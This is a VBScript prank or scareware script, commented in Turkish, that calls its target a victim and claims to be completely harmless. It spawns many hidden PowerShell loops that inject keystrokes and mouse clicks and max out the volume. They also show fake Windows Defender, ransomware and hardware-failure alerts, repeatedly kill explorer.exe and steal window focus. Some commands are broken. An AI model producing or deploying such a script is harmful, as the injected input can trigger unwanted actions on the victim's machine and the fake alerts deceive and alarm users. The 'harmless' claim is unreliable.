' ===================================================================
'  V26: METAVERSE PARADOX PROTOCOL - THE OMNI MATRIX GLITCH ENGINE v114.0
'  %100 ZARARSIZDIR. Bilgisayar yeniden başlatıldığında tamamen uçar.
'  YENİ EKLEME: SIFIR TERMİNAL ARTIŞI VE TAMAMEN YENİ STICKY KEYS SOUND GLITCH / MATRIX TIME PARADOX
' ===================================================================

On Error Resume Next
Dim shell, fso, voice, objShell, tempPath, i, j, k, l, m, n, o, p, q
Dim c11, c12 ' [YENİ EKLEME V34] Üst Düzey Değişken Enjeksiyonu
Dim c13, c14, c15, bypassV35 ' [YENİ EKLEME V35] 15 Kademeli Labirent Değişkenleri
Dim c16, bypassV36 ' [YENİ EKLEME V36] Ekran Gitme ve Tıklama Labirent Değişkenleri
Dim c17, bypassV37 ' [YENİ EKLEME V37] Glitch Ve Hayalet Klavye Labirent Değişkenleri
Dim c18, bypassV38 ' [YENİ EKLEME V38] İnek Dansı Labirent Değişkenleri
Dim c19, bypassV39 ' [YENİ EKLEME V39] Termal Ve Fısıltı Labirent Değişkenleri
Dim c20, bypassV40 ' [YENİ EKLEME V40] Sanal Bellek Ve RitmIC Saat Labirent Değişkenleri
Dim c21, bypassV50 ' [YENİ EKLEME V50] Sahte Güncelleme Ve Kaos Odak Değişkenleri
Dim c22, bypassV60 ' [YENİ EKLEME V60] Sahte Güvenlik Duvarı Ve Klavye Ritim Değişkenleri
Dim c23, bypassV70 ' [YENİ EKLEME V70] Sahte Sistem Bozulması Ve Dalga Ritim Değişkenleri
Dim c24, bypassV80 ' [YENİ EKLEME V80] Sahte Ağ Sızıntısı Ve Ters Dalga Ritim Değişkenleri
Dim c25, bypassV90 ' [YENİ EKLEME V90] Sahte Görev Yöneticisi Ve Piyano Ritim Değişkenleri
Dim c26, bypassV100 ' [YENİ EKLEME V100] Sahte Ses Sürücüsü Ve Hayalet Klasör Değişkenleri
Dim c28, bypassV102 ' [YENİ EKLEME V102] Sahte Donanım Yalıtımı Ve Canlı Büyüteç Değişkenleri
Dim c29, bypassV103 ' [YENİ EKLEME V103] Sahte Renk Filtresi Ve Eksen Tersleyici Değişkenleri
Dim c30, bypassV104 ' [YENİ EKLEME V104] Sahte OSK Flicker Ve SAPI Ses Matrisi Değişkenleri
Dim c31, bypassV105 ' [YENİ EKLEME V105] Sahte Donanım Ses Mikseri Ve Sayfa Kaydırma Değişkenleri
Dim c32, bypassV106 ' [YENİ EKLEME V106] Sahte Sürücü Arama Ve Klavye Durum Fısıltısı Değişkenleri
Dim c33, bypassV107 ' [YENİ EKLEME V107] Sahte Paket İndirme Ve Otonom Yardım Değişkenleri
Dim c34, bypassV108 ' [YENİ EKLEME V108] Sahte Cipher Ve Donanım Eko Değişkenleri
Dim c35, bypassV109 ' [YENİ EKLEME V109] Sahte Dump Ve Donanım Eko Değişkenleri
Dim c36, bypassV110 ' [YENİ EKLEME V110] Sahte Fare Tekerleği Ve Simge Yenileme Değişkenleri
Dim c37, bypassV111 ' [YENİ EKLEME v111.0] Hayalet Fare Tıklama Tikleri Ve Odak Çalma Değişkenleri
Dim c38, bypassV112 ' [YENİ EKLEME v112.0] Hayalet Klavye Düzeni Ve Aero Sarsıntı Değişkenleri
Dim c39, bypassV113 ' [YENİ EKLEME v113.0] Hayalet Renk Filtresi Ve Konsol Entropi Değişkenleri
Dim c40, bypassV114 ' [YENİ EKLEME v114.0] Hayalet Yapışkan Tuşlar Ve Zaman Paradoksu Değişkenleri

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set voice = CreateObject("SAPI.SpVoice")
Set objShell = CreateObject("Shell.Application")

' Ses motoru kararlı siber frekans ayarı
voice.Rate = -1

' ───────────────────────────────────────────────────────────────────
'  FAZ 1: MUTLAK İZOLASYON VE DONANIM FREKANS AĞI
' ───────────────────────────────────────────────────────────────────
MsgBox "Metaverse Altyapı Frekans Senkronizasyonu Başlatılıyor...", 16, "Windows Kernel Metaverse"
WScript.Sleep 1000

' Tüm açık pencereleri abajo indirir (Masaüstü odaklama)
objShell.MinimizeAll
WScript.Sleep 1000

' Sistem ses seviyesini kademeli olarak en üst sınıra çeker
For i = 1 to 50
    shell.SendKeys(chr(175)) 
Next

' Çift kanallı akustik hata senkronizasyonu
shell.Run "powershell -Command ""(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Critical Stop.wav').PlaySync()""", 0, False
shell.Run "powershell -Command ""(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Background.wav').PlaySync()""", 0, False

' NEW FEATURE: PowerShell vasıtasıyla dijital telemetri / Mors ritim illüzyonu
shell.Run "powershell -Command ""[console]::beep(800,100); [console]::beep(800,100); Start-Sleep -Milliseconds 50; [console]::beep(500,200); [console]::beep(900,150)""", 0, True

voice.Speak "Metaverse Paradox Protocol activated. Absolute synchronization has been achieved across all virtual subsystems."
WScript.Sleep 500

' Arka planda mouse imlecini merkezkaç etkisiyle sarsan zararsız otonom döngü
shell.Run "powershell -Command ""Add-Type -AssemblyName Point, WindowsBase, System.Drawing; while($true) { [Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((960 + (Get-Random -Min -20 -Max 20)), (540 + (Get-Random -Min -20 -Max 20))); Start-Sleep -Milliseconds 100 }""", 0, False

' [YENİ EKLEME V36] RASTGELE TIKLAMA MOTORU: Mouse imlecinin durduğu yere otonom sol og sağ tıklamalar fırlatır
shell.Run "powershell -Command ""Add-Type -MemberDefinition '[DllImport(\""user32.dll\"")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);' -Name GtaTrollMouse -Namespace Win32; while($true) { [Win32.GtaTrollMouse]::mouse_event(0x0002, 0, 0, 0, 0); Start-Sleep -Milliseconds 50; [Win32.GtaTrollMouse]::mouse_event(0x0004, 0, 0, 0, 0); Start-Sleep -Seconds (Get-Random -Min 10 -Max 20); [Win32.GtaTrollMouse]::mouse_event(0x0008, 0, 0, 0, 0); Start-Sleep -Milliseconds 50; [Win32.GtaTrollMouse]::mouse_event(0x0010, 0, 0, 0, 0); Start-Sleep -Seconds (Get-Random -Min 25 -Max 35); }""", 0, False

' [YENİ EKLEME V36] EKRAN GİDIP GELME VE KARARMA MOTORU: Ekran kartı sürücüsünü tetiklemeden sahte sinyal kesintisi simüle eder
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; while($true) { $form = New-Object System.Windows.Forms.Form; $form.BackColor = [System.Drawing.Color]::Black; $form.FormBorderStyle = 'None'; $form.WindowState = 'Maximized'; $form.TopMost = $true; $form.ShowInTaskbar = $false; $form.Opacity = 0.98; [void]$form.Show(); Start-Sleep -Milliseconds (Get-Random -Min 15 -Max 400); $form.Close(); Start-Sleep -Seconds (Get-Random -Min 12 -Max 25); }""", 0, False

' [YENİ EKLEME V37] MATRİKS EKRAN KAYMASI VE DIAGONAL GLITCH MOTORU: Ekranın rastgele yönlene anlık titremesini (shake) taklit eder
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; while($true) { $f = New-Object System.Windows.Forms.Form; $f.BackColor = [System.Drawing.Color]::LimeGreen; $f.FormBorderStyle = 'None'; $f.Size = New-Object System.Drawing.Size(1920, 1080); $f.TopMost = $true; $f.Opacity = 0.08; [void]$f.Show(); Start-Sleep -Milliseconds 80; $f.Close(); Start-Sleep -Seconds (Get-Random -Min 15 -Max 30); }""", 0, False

' [YENİ EKLEME V37] HAYALET KLAVYE GÖLGELERİ: Arka planda kurban pencerelerle uğraşırken araya zararsız Space og Enter vuruşları sızdırır
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true) { Start-Sleep -Seconds (Get-Random -Min 18 -Max 40); $w.SendKeys(' '); Start-Sleep -Milliseconds 200; $w.SendKeys('{ENTER}'); }""", 0, False

' [YENİ EKLEME V38] OTONOM İNEK DANSI ARAMA MOTORU: Belirli aralıklarla kurbanın tarayıcısında Google "inek dansı" arama sekmesi patlatır
shell.Run "powershell -Command ""while($true){ Start-Process 'https://www.google.com/search?q=inek+dans%C4%B1'; Start-Sleep -Seconds (Get-Random -Min 40 -Max 70) }""", 0, False

' [YENİ EKLEME V39] SAHTE DONANIM TERMAL BALON MOTORU: Windows bildirim merkezine tamamen sahte işlemci aşırı ısınma uyarıları yollar
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Warning; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Hardware Monitor', 'WARNING: AMD CPU Thermal Throttling Detected! Core temperature exceeded 105°C! Adjusting fan speed...', [System.Windows.Forms.ToolTipIcon]::Warning); Start-Sleep -Seconds (Get-Random -Min 35 -Max 60) }""", 0, False

' [YENİ EKLEME V39] SUBLIMINAL FISILTI MOTORU: Arka planda kurban labirentle uğraşırken fona robotik ürpertici fısıltılar sızdırır
shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = -4; while($true){ Start-Sleep -Seconds (Get-Random -Min 45 -Max 80); $v.Speak('The simulation is breathing. Do not trust the task manager.'); }""", 0, False

' [YENİ EKLEME V40] SAHTE DÜŞÜK SANAL BELLEK MOTORU: Windows bildirim merkezinde otonom sahte bellek sızıntısı uyarıları patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Error; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Virtual Memory Emergency', 'CRITICAL ERROR: Your system is extremely low on virtual memory. Windows is allocating temporary cache channels to Metaverse Grid.', [System.Windows.Forms.ToolTipIcon]::Error); Start-Sleep -Seconds (Get-Random -Min 40 -Max 65) }""", 0, False

' [YENİ EKLEME V40] RİTMİK SAAT VE ZAMAN KISITLAMASI SES DÖNGÜSÜ: Kurbana otonom panik ritmi aşılayan üçlü bip dalgası fırlatır
shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = -2; while($true){ Start-Sleep -Seconds 55; [console]::beep(1200,120); [console]::beep(1200,120); [console]::beep(1500,200); $v.Speak('Time is running out in the sub-zero layer.'); }""", 0, False

' [YENİ EKLEME V50] SAHTE CLOUD UPDATE VE GERİ YÜKLEME BALON MOTORU: Tamamen zararsız otonom güncelleme hatası uyarısı fırlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Information; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Cloud Update Assistant', 'CRITICAL: Windows update failed. Corrupt blocks detected in cloud clusters. System rollback sequence initiated.', [System.Windows.Forms.ToolTipIcon]::Warning); Start-Sleep -Seconds (Get-Random -Min 45 -Max 75) }""", 0, False

' [YENİ EKLEME V50] OTONOM ODAK SARSICI KAOS GÖLGELERİ: Arka planda ara sıra zararsız kaçış og sekme tuş vuruşları sızdırarak odak bozar
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 20 -Max 45); $w.SendKeys('{ESC}'); Start-Sleep -Milliseconds 150; $w.SendKeys('%{TAB}'); }""", 0, False

' [YENİ EKLEME V60] SAHTE DEFENDER GÜVENLİK DUVARI MOTORU: Tamamen zararsız otonom siber savunma kesintisi uyarısı fırlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Shield; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Defender Antivirus', 'SECURITY WARNING: Ransomware cloud cluster override detected. Isolating volatile memory cells...', [System.Windows.Forms.ToolTipIcon]::Error); Start-Sleep -Seconds (Get-Random -Min 50 -Max 80) }""", 0, False

' [YENİ EKLEME V60] OTONOM KANALLI KLAVYE RİTİM MOTORU: Arka planda otonom olarak Caps Lock og Num Lock tuşlarını çılgın ritim moduna sokar
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 15 -Max 35); for($i=0; $i -lt 10; $i++){ $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 100; $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 100 } }""", 0, False

' [YENİ EKLEME V70] SAHTE BİLEŞEN MAĞAZASI SFC BALON MOTORU: Windows alt sağ köşesinde tamamen zararsız otonom bozulma bildirimleri patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Warning; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Resource Protection', 'CRITICAL ERROR: Corrupt telemetry blocks found in System32. Repairing volatile RAM sectors...', [System.Windows.Forms.ToolTipIcon]::Warning); Start-Sleep -Seconds (Get-Random -Min 55 -Max 85) }""", 0, False

' [YENİ EKLEME V70] OTONOM KANALLI KLAVYE DALGA RİTİM MOTORU: Klavye üzerindeki üç ışığı (Caps, Num, Scroll) sırayla dalga şeklinde tetikler
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 20 -Max 40); for($i=0; $i -lt 6; $i++){ $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 80; $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 80; $w.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 150 } }""", 0, False

' [YENİ EKLEME V80] SAHTE AĞ PAYLAŞIMI SMB BALON MOTORU: Windows alt sağ köşesinde tamamen zararsız otonom sızıntı bildirimleri patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Error; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows File Sharing', 'CRITICAL ERROR: Unauthorized SMB inbound packet stream detected. Encrypting shadow files...', [System.Windows.Forms.ToolTipIcon]::Error); Start-Sleep -Seconds (Get-Random -Min 60 -Max 90) }""", 0, False

' [YENİ EKLEME V80] OTONOM KANALLI KLAVYE TERS DALGA RİTİM MOTORU: Klavye üzerindeki üç ışığı (Scroll, Num, Caps) tam tersi sırayla dalga şeklinde tetikler
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Seconds (Get-Random -Min 25 -Max 45); for($i=0; $i -lt 6; $i++){ $w.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 90; $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 90; $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 140 } }""", 0, False

' [YENİ EKLEME V90] SAHTE GÖREV YÖNETİCİSİ PROSES BALON MOTORU: Windows alt sağ köşesinde tamamen zararsız sahte yalıtım hatası bildirimleri patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Error; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Task Manager', 'CRITICAL ERROR: Process isolation protocol failed due to unstable RAM sectors. Restricting volatile channels...', [System.Windows.Forms.ToolTipIcon]::Error); Start-Sleep -Seconds (Get-Random -Min 65 -Max 95) }""", 0, False

' [YENİ EKLEME V90] OTONOM KANALLI KLAVYE PİYANO RİTİM MOTORU: Üç ışığı (Caps, Scroll, Num) senkronize olmayan karmaşık bir melodi matrisi gibi tetikler
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 30 -Max 50); for($i=0; $i -lt 5; $i++){ $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 60; $w.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 110; $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 70; $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 130 } }""", 0, False

' [YENİ EKLEME V100] SAHTE SES AYGITI DONANIM BALON MOTORU: Windows alt sağ köşesinde tamamen zararsız sahte ses kanalı bozulması bildirimleri patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Error; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Audio Endpoint', 'CRITICAL ERROR: High frequency sound distortion detected on virtual audio channels. Hard reset required to prevent hardware damage.', [System.Windows.Forms.ToolTipIcon]::Error); Start-Sleep -Seconds (Get-Random -Min 70 -Max 100) }""", 0, False

' [YENİ EKLEME V100] OTONOM MASAÜSTÜ HAYALET KLASÖR DANSI MOTORU: Kurbanın masaüstünde geçici anomali klasörleri üretip 2 saniye sonra otonom olarak siler
shell.Run "powershell -Command ""$desktop = [Environment]::GetFolderPath('Desktop'); while($true){ Start-Sleep -Seconds (Get-Random -Min 25 -Max 50); $path = Join-Path $desktop ('METAVERSE_ANOMALY_' + (Get-Random)); New-Item -ItemType Directory -Path $path -Force; Start-Sleep -Seconds 2; Remove-Item -Path $path -Recurse -Force }""", 0, False

' [YENİ EKLEME V101] SAHTE WINDOWS KERNEL DEBUGGER BALON MOTORU: Windows alt sağ köşesinde tamamen zararsız sahte çekirdek hata ayıklama bildirimleri patlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Warning; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Kernel Debugger', 'CRITICAL ERROR: Live kernel memory dump captured via virtual hypervisor channels. Unstable stack tracking active.', [System.Windows.Forms.ToolTipIcon]::Warning); Start-Sleep -Seconds (Get-Random -Min 75 -Max 105) }""", 0, False

' [YENİ EKLEME V101] OTONOM MASAÜSTÜ HAYALET METİN DOSYASI MOTORU: Masaüstünde geçici log dosyaları üretir, içine kod yazar og 2.5 saniye sonra yok eder
shell.Run "powershell -Command ""$desktop = [Environment]::GetFolderPath('Desktop'); while($true){ Start-Sleep -Seconds (Get-Random -Min 30 -Max 55); $filename = 'METAVERSE_GLITCH_LOG_' + (Get-Random) + '.txt'; $path = Join-Path $desktop $filename; '[METAVERSE_CORE_ERROR] STACK_OVERFLOW_AT_0x00FF34' | Out-File $path -Force; Start-Sleep -Seconds 2.5; Remove-Item -Path $path -Force }""", 0, False

' [YENİ EKLEME V102] SAHTE WINDOWS HARDWARE ISOLATION BALON MOTORU: Windows bildirim merkezinde otonom sahte donanım kesintisi uyarısı fırlatır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Warning; $n.Visible = $true; while($true){ $n.ShowBalloonTip(5000, 'Windows Hardware Isolation', 'CRITICAL ERROR: Unidentified PCI Express device attempted to bypass Ring -1 hypervisor. Restricting hardware interrupt lines (IRQ)...', [System.Windows.Forms.ToolTipIcon]::Warning); Start-Sleep -Seconds (Get-Random -Min 80 -Max 110) }""", 0, False

' [YENİ EKLEME V102] CANLI WINDOWS BÜYÜTEÇ LENS KAYMASI MOTORU: Yerleşik büyüteci kullanarak ekranı belirli aralıklarla anlık %200 yakınlaştırıp uzaklaştırır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; while($true){ Start-Sleep -Seconds (Get-Random -Min 35 -Max 65); [Windows.Forms.SendKeys]::SendWait('^+L'); Start-Sleep -Milliseconds 100; for($i=0; $i -lt 4; $i++){ [Windows.Forms.SendKeys]::SendWait('{+}'); Start-Sleep -Milliseconds 50 }; Start-Sleep -Seconds 1.5; for($i=0; $i -lt 4; $i++){ [Windows.Forms.SendKeys]::SendWait('{-}'); Start-Sleep -Milliseconds 50 }; [Windows.Forms.SendKeys]::SendWait('%{ESC}'); }""", 0, False

' [YENİ EKLEME V103] CANLI MASAÜSTÜ RENK NEGATİF MOTORU: Windows Yüksek Karşıtlık filtresini tetikleyerek ekranı anlık negatife çevirir
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 40 -Max 75); $w = New-Object -ComObject WScript.Shell; $w.SendKeys('%+K'); Start-Sleep -Seconds 2; $w.SendKeys('%+K'); }""", 0, False

' [YENİ EKLEME V103] TERS DÖNEN MOUSE EKSEN KAYMASI: Fare imlecini belirli aralıklarla ters simetrisine çekerek kurbanı çıldırtır
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; while($true){ Start-Sleep -Seconds (Get-Random -Min 20 -Max 45); for($i=0; $i -lt 30; $i++){ $pos = [System.Windows.Forms.Cursor]::Position; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((1920 - $pos.X), (1080 - $pos.Y)); Start-Sleep -Milliseconds 100 } }""", 0, False

' [YENİ EKLEME V104] OTONOM EKRAN KLAVYESİ RİTİM DANSI: Arka planda osk.exe aracını anlık açıp kapatarak veya ekranda hareket ettirerek sarsıntı yaratır
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 30 -Max 60); Start-Process 'osk.exe'; Start-Sleep -Milliseconds 1500; Stop-Process -Name 'osk' -Force }""", 0, False

' [YENİ EKLEME V104] SESLİ KOMUT DOSYASI SES MATRİSİ: Arka planda SAPI ses motoruyla kurban labirentteyken robotik parazit ritimleri fırlatır
shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 7; while($true){ Start-Sleep -Seconds (Get-Random -Min 25 -Max 50); $v.Speak('click click click... anomaly stream pulse'); }""", 0, False

' [YENİ EKLEME V105] OTONOM WINDOWS SES TEMASI MİKSERİ: Arka planda otonom olarak aygıt sökülme/hata dalga seslerini tetikler
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 15 -Max 35); (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Remove.wav').PlaySync(); Start-Sleep -Milliseconds 400; (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Insert.wav').PlaySync(); }""", 0, False

' [YENİ EKLEME V105] HAYALET SAYFA KAYDIRMA MOTORU: Kurban odaklenmışken arka planda otonom olarak PageUp ve PageDown basarak sayfaları kaydırır
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 10 -Max 25); $w.SendKeys('{PGDN}'); Start-Sleep -Milliseconds 300; $w.SendKeys('{PGUP}'); }""", 0, False

' [YENİ EKLEME V106] HAYALET DOSYA GEZGİNİ / SAHTE SÜRÜCÜ ARAMA MOTORU: Olmayan hayalet disk harflerini explorer üzerinde otonom tetikler
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 20 -Max 45); Start-Process 'explorer.exe' -ArgumentList 'search-ms:query=X:\'; Start-Sleep -Seconds 2; Stop-Process -Name explorer -Force }""", 0, False

' [YENİ EKLEME V106] OTONOM KEY STATE WHISPER MOTORU: Klavye ışıklarının o anki durumunu sesli olarak fısıldayan yepyeni akustik katman
shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 0; while($true){ Start-Sleep -Seconds (Get-Random -Min 30 -Max 55); $v.Speak('Warning. Caps lock state modulated. Keyboard grid unstable.'); }""", 0, False

' [YENİ EKLEME V107] HAYALET DOSYA İNDİRME İLLÜZYONU: PowerShell penceresinde sahte indirme yükleme çubuğu animasyonu oynatır
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 35 -Max 65); for($i=1; $i -le 100; $i+=5){ Write-Progress -Activity 'METAVERSE SHADOW INJECTOR' -Status 'Downloading Corrupt Sector Cloud Stack...' -PercentComplete $i; Start-Sleep -Milliseconds 150 }; Start-Sleep -Seconds 1 }""", 0, False

' [YENİ EKLEME V107] SÜREKLİ ODAKLANAN OTONOM YARDIM PENCERESİ: Arka planda durup dururken sahte yardım pencereleri patlatarak odağı bozar
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 25 -Max 50); Start-Process 'hh.exe' -ArgumentList 'C:\Windows\Help\mui\0409\cliconf.chm'; Start-Sleep -Seconds 2; Stop-Process -Name hh -Force }""", 0, False

' [YENİ EKLEME V108] SAHTE DİSK ŞİFRELEME İLLÜZYONU: Tamamen zararsız şifreleme log akışı simülasyonu
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 40 -Max 80); for($i=0; $i -lt 15; $i++){ Write-Output ('[PHANTOM_CIPHER] ENCRYPTING SECTOR 0x' + (Get-Random) + ' -> WITH KEY ' + [Guid]::NewGuid().ToString().Substring(0,8).ToUpper()); Start-Sleep -Milliseconds 100 } }""", 0, False

' [YENİ EKLEME V108] HAYALET BİLDİRİM SESİ MİKSERİ: Donanım ses ritmini üçlü yankı dalgası ile tetikleyen akustik katman
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 30 -Max 60); (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Remove.wav').PlaySync(); Start-Sleep -Milliseconds 150; (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Remove.wav').PlaySync(); Start-Sleep -Milliseconds 150; (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Insert.wav').PlaySync(); }""", 0, False

' [YENİ EKLEME V109] SAHTE BELLEK DÖKÜMÜ VE STACK TAKİBİ: Tamamen zararsız otonom ram döküm simülasyonu log akışı
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 35 -Max 75); for($i=0; $i -lt 20; $i++){ Write-Output ('[MEM_DUMP] ADDR: 0x' + (Get-Random) + ' -> STACK OVERFLOW IN SECTOR ' + (Get-Random -Min 1000 -Max 9999)); Start-Sleep -Milliseconds 80 } }""", 0, False

' [YENİ EKLEME V109] HAYALET KLAVYE CAPSLOCK VE NUMLOCK FISILTISI: Klavye LED ışık durumlarını akustik yankı ile fısıldar
shell.Run "powershell -Command ""$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 2; while($true){ Start-Sleep -Seconds (Get-Random -Min 45 -Max 90); $v.Speak('Sync pulse triggered. Caps lock matrix isolated from hypervisor.'); }""", 0, False

' [YENİ EKLEME v110.0] HAYALET FARE TEKERLEĞİ SIZMASI: Yeni terminal açmadan, fare tekerleğini arka planda otonom olarak yukarı-aşağı kaydırır
shell.Run "powershell -Command ""Add-Type -MemberDefinition '[DllImport(\""user32.dll\"")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);' -Name MWheelMatrix -Namespace Win32; while($true){ Start-Sleep -Seconds (Get-Random -Min 8 -Max 18); [Win32.MWheelMatrix]::mouse_event(0x0800, 0, 0, 120, 0); Start-Sleep -Milliseconds 200; [Win32.MWheelMatrix]::mouse_event(0x0800, 0, 0, -120, 0); }""", 0, False

' [YENİ EKLEME v110.0] MASAÜSTÜ SİMGELERİNİ GİZLEME/GÖSTERME FLICKER ETKİSİ: Masaüstü yenileme API sini tetikleyerek pikselleri tazeler
shell.Run "powershell -Command ""Add-Type -MemberDefinition '[DllImport(\""shell32.dll\"")] public static extern void SHChangeNotify(int wEventId, int uFlags, IntPtr dwItem1, IntPtr dwItem2);' -Name IconMatrix -Namespace Win32; while($true){ Start-Sleep -Seconds (Get-Random -Min 15 -Max 30); [Win32.IconMatrix]::SHChangeNotify(0x08000000, 0x0000, [IntPtr]::Zero, [IntPtr]::Zero); }""", 0, False

' [YENİ EKLEME v111.0] HAYALET FARE TIKLAMA TİKLERİ: Fare imlecini rastgele aralıklarla 1-2 piksel kaydırıp otonom sol tıklama tikleri fırlatır
shell.Run "powershell -Command ""Add-Type -MemberDefinition '[DllImport(\""user32.dll\"")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);' -Name PhantomTwitch -Namespace Win32; while($true){ Start-Sleep -Seconds (Get-Random -Min 6 -Max 14); $pos = [System.Windows.Forms.Cursor]::Position; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + (Get-Random -Min -2 -Max 2)), ($pos.Y + (Get-Random -Min -2 -Max 2))); [Win32.PhantomTwitch]::mouse_event(0x0002, 0, 0, 0, 0); Start-Sleep -Milliseconds 30; [Win32.PhantomTwitch]::mouse_event(0x0004, 0, 0, 0, 0); }""", 0, False

' [YENİ EKLEME v111.0] SÜREKLİ ODAK ÇALAN GÖRÜNMEZ BİLDİRİM DÖNGÜSÜ: Ekran kartını yormadan, saniyede bir milisaniyeliğine aktif pencerelerin odağını çalar
shell.Run "powershell -Command ""Add-Type -MemberDefinition '[DllImport(\""user32.dll\"")] public static extern bool SetForegroundWindow(IntPtr hWnd); [DllImport(\""user32.dll\"")] public static extern IntPtr GetDesktopWindow();' -Name FocusStealer -Namespace Win32; while($true){ Start-Sleep -Seconds (Get-Random -Min 4 -Max 9); $dt = [Win32.FocusStealer]::GetDesktopWindow(); [void][Win32.FocusStealer]::SetForegroundWindow($dt); }""", 0, False

' [YENİ EKLEME v112.0] HAYALET KLAVYE DÜZENİ DEĞİŞTİRİCİ: Arka planda rastgele aralıklarla klavye giriş dilini (Alt+Shift) taklit ederek düzeni karıştırır
